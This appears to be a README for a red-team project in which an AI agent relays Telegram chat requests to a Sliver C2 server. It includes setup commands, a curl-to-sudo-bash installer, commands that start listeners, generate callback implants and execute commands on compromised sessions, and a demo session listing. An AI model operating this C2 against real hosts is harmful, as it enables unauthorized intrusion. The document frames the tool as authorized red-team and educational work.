# ShadowC2 — AI-Controlled Red Team C2 via Telegram

> Control your Sliver C2 server through a Telegram bot powered by an AI agent. No console. No SSH. Just chat.

![Sliver](https://img.shields.io/badge/C2-Sliver_v1.7.3-green?style=flat-square)
![Python](https://img.shields.io/badge/Python-3.10+-blue?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Ubuntu_Server-orange?style=flat-square)
![Agent](https://img.shields.io/badge/Agent-OpenClaw-purple?style=flat-square)
![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square)

---

## What Is This?

ShadowC2 is a red team automation project that bridges the gap between a Sliver C2 server and a Telegram bot using an AI agent called Shadow (powered by OpenClaw).

Instead of SSHing into your server and typing commands in the Sliver console, you simply message your Telegram bot:

> "see any active sessions"
> "list files in /tmp on the session"
> "give me system details of the affected machine"

Shadow reads the Sliver skill, runs the appropriate command, and replies with clean output — directly in Telegram.

---

## Architecture

```
Operator (Telegram)
        │
        ▼
  Telegram Bot (@RedTeaming_ai_bot)
        │
        ▼
  OpenClaw Gateway (Ubuntu Server)
  └── Shadow AI Agent
        │  reads SKILL.md
        ▼
  sliver_client.py (Python wrapper)
        │  uses --rc batch mode
        ▼
  Sliver Client (/usr/local/bin/sliver)
        │
        ▼
  Sliver Server (localhost:31337)
        │  HTTPS listener :443
        ▼
  Implant on Target Machine
  (LINGUISTIC_ANALYST — Kali Linux)
```

All components run on a single Ubuntu server. The operator controls everything remotely via Telegram.

---

## Stack

| Component | Tool | Purpose |
|---|---|---|
| C2 Framework | Sliver v1.7.3 | Command and control server |
| AI Agent | OpenClaw + Shadow | Natural language to Sliver commands |
| Messaging | Telegram Bot | Remote operator interface |
| Wrapper | sliver_client.py | Python CLI bridge for Sliver |
| OS | Ubuntu Server | Host for all components |

---

## Features

- **Natural language control** — tell Shadow what you want in plain English
- **Session management** — list, interact with, and query active sessions
- **Live recon** — get files, processes, system info, network details from compromised hosts
- **Listener management** — start/stop HTTP, HTTPS, mTLS, DNS listeners
- **Implant generation** — generate Linux/Windows/macOS implants on demand
- **Skill-based** — Shadow reads a `SKILL.md` to know exactly how to use Sliver
- **Single machine setup** — server, client, and agent all on one Ubuntu box

---

## Project Structure

```
~/.openclaw/workspace/
├── sliver_client.py          # Python wrapper for Sliver CLI
├── skills/
│   └── sliver/
│       └── SKILL.md          # Shadow's Sliver instruction manual
├── SOUL.md                   # Agent identity and behavior
├── USER.md                   # Operator profile
└── TOOLS.md                  # Infrastructure notes

/usr/local/bin/
├── sliver                    # Sliver client binary
└── sliver-server             # Sliver server binary (at /root/)
```

---

## Quick Start

### 1. Install Sliver

```bash
curl https://sliver.sh/install | sudo bash
```

### 2. Verify server is running

```bash
sudo systemctl status sliver
sliver-client version
```

### 3. Install OpenClaw

```bash
npm install -g openclaw
openclaw setup
```

### 4. Install the Sliver skill

```bash
mkdir -p ~/.openclaw/workspace/skills/sliver
cp SKILL.md ~/.openclaw/workspace/skills/sliver/
cp sliver_client.py ~/.openclaw/workspace/
```

### 5. Configure Telegram bot

```bash
openclaw channels login --channel telegram
```

### 6. Start the gateway

```bash
systemctl --user start openclaw-gateway.service
systemctl --user enable openclaw-gateway.service
```

### 7. Start a listener and generate an implant

```bash
python3 ~/.openclaw/workspace/sliver_client.py listen --protocol https --lport 443
python3 ~/.openclaw/workspace/sliver_client.py generate myimplant --os linux --arch amd64 --lhost <server-ip> --lport 443
```

### 8. Control via Telegram

Message your bot:
```
check C2 status
see active sessions
list files in /tmp on the session
give me system info of the affected machine
```

---

## sliver_client.py Usage

```bash
# Check everything
python3 sliver_client.py status

# Listeners
python3 sliver_client.py jobs
python3 sliver_client.py listen --protocol https --lport 443

# Sessions & Beacons
python3 sliver_client.py sessions
python3 sliver_client.py beacons

# Implants
python3 sliver_client.py implants
python3 sliver_client.py generate NAME --os linux --arch amd64 --lhost IP --lport 443

# Execute on session
python3 sliver_client.py exec <session-id> whoami
python3 sliver_client.py exec <session-id> ls /tmp
```

---

## Demo

**Operator asks Shadow via Telegram:**
> "see any jobs are there"

**Shadow responds:**
```
C2 Status:
Jobs (Listeners):
• Job ID 1: HTTPS listener on port 443
Sessions: None active
Beacons: None active
Summary: One HTTPS listener is running and ready, but no implants have checked in yet.
```

**After implant connects:**
> "see the active sessions and beacons"

```
Active Sessions:
• ID: 08e4d756
• Name: LINGUISTIC_ANALYST
• Transport: HTTP(S)
• Remote: 100.117.121.92:45638
• Hostname: kali
• User: botnoob
• OS: Linux/amd64
• Status: [ALIVE]
```

---

## Security Notice

This project is built for **authorized red team engagements and educational purposes only**. Only use on systems you own or have explicit written permission to test. Unauthorized use is illegal.

---

## Author

Built as part of a practical red team C2 project covering Sliver theory, installation, implant generation, and AI-driven operator automation.

---

## License

MIT License — use responsibly.
